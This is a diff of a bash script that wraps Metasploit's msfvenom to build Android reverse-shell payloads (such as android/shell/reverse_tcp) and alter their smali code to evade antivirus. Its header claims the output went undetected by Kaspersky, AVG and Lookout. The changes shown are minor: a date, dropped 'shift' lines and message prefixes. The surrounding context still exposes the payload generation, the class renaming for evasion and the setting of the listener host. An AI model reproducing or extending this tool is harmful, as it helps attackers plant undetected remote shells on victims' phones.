@@ -3,7 +3,7 @@
 #########################################################################################
 # Author: Justin Breed                                                                  #
 # Purpose: Script for generating MSFVenom payloads with AV bypass for Android.          #
-# Tested Date: 20Mar17                                                                  #
+# Tested Date: 21Mar17                                                                  #
 # NoDistribute: 0% Detection                                                            #
 # Flagged by: Avast (PUP - Not much you can do here without building a reputation)      #
 # Verified manually and successfully bypassed: Kaspersky, AVG, Lookout                  #
@@ -93,7 +93,6 @@ android/shell/reverse_tcp               Spawn a piped command shell (sh). Connec
 				;;
 			-g* | --generate )
 				willRun=1
-				shift
 				;;
 			-x* | --original )
 				willRun=1
@@ -102,15 +101,12 @@ android/shell/reverse_tcp               Spawn a piped command shell (sh). Connec
 				;;
 			-v* | --verbose )
 				VERBOSE=1
-				shift
 				;;
 			-n* | --newkey )
 				rm -rf ~/.android/debug.keystore &> /dev/null
-				shift
 				;;
 			-d* | --debug )
 				DEBUG=1
-				shift
 				;;
 			* )
 				REMAINS="$REMAINS \"$OPT\""
@@ -161,13 +157,13 @@ if [ -z $inFile ]; then
 else 
 	#echo -e "\033[34m [-] \x1B[0m msfvenom -x $inFile -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -o $outFile"
 	#redirect msfvenom -p $PAYLOAD LHOST\=$LHOST $LPORT\=LPORT -x $inFile -o $outFile
-	echo -e "\033[31m [-] \x1B[0m Sorry, but the injection method hasn't been implemented yet. Coming soon!"
+	echo -e "\033[31m [!] \x1B[0m Sorry, but the injection method hasn't been implemented yet. Coming soon!"
 	exit 1
 fi
 
 ### Exit if there was no file generated. ###
 if [ ! -f $outFile ]; then
-	echo -e "\033[31m [-] \x1B[0m MSFVenom payload generation failed."
+	echo -e "\033[31m [!] \x1B[0m MSFVenom payload generation failed."
 	exit 1
 else
 	echo -e "\033[32m [-] \x1B[0m MSFVenom payload successfully generated."
@@ -212,7 +208,7 @@ mv /tmp/payload/smali/com/$VAR1/$VAR2/Payload.smali /tmp/payload/smali/com/$VAR1
 
 ### Exit the script if an older payload was generated ###
 if [ -f /tmp/payload/smali/com/$VAR1/$VAR2/PayloadTrustManager.smali ]; then
-    echo -e "\033[31m [-] \x1B[0m An old version of the msfvenom generated payload was detected. Make sure you have everything compeltely updated in Kali! \n\n Older payloads have not been configured in this script to bypass AV. With that, this script still results in a 1/35 on nodistribute.com for the old payloads, but it is not recommended to continue. Ex: # apt-get update && apt-get dist-upgrade"
+    echo -e "\033[31m [!] \x1B[0m An old version of the msfvenom generated payload was detected. Make sure you have everything compeltely updated in Kali! \n\n Older payloads have not been configured in this script to bypass AV. With that, this script still results in a 1/35 on nodistribute.com for the old payloads, but it is not recommended to continue. Ex: # apt-get update && apt-get dist-upgrade"
     exit 1
 fi
 
@@ -277,7 +273,7 @@ then
 	    echo -e "\033[32m [-] \x1B[0m Inserting LHOST=${localAddArray[$userSelectedAdd]} into the listener script."
 	    LHOST=${localAddArray[$userSelectedAdd]}
     else
-        echo -e "\033[31m [-] \x1B[0m Invalid entry. Will continue the script with LHOST=$LHOST"
+        echo -e "\033[31m [!] \x1B[0m Invalid entry. Will continue the script with LHOST=$LHOST"
     fi
 fi
 read -r -p " [-]  Add an AutoRunScript? [y/N] " response
